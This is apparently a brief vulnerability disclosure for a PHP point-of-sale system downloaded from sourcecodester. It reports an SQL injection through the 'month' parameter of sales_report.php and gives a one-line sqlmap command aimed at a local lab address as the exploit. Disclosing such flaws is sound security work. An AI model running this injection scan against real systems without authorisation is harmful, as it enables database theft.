vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Vulnerability trigger parameter: $month

The process of vulnerability discovery is as follows：

![image-20230223220655535](C:\markdown\images\image-20230223220655535.png)

exp

```
sqlmap.py -u "http://192.168.31.50/kruxton/sales_report.php?month=1"
```

![image-20230223220621112](C:\markdown\images\image-20230223220621112.png)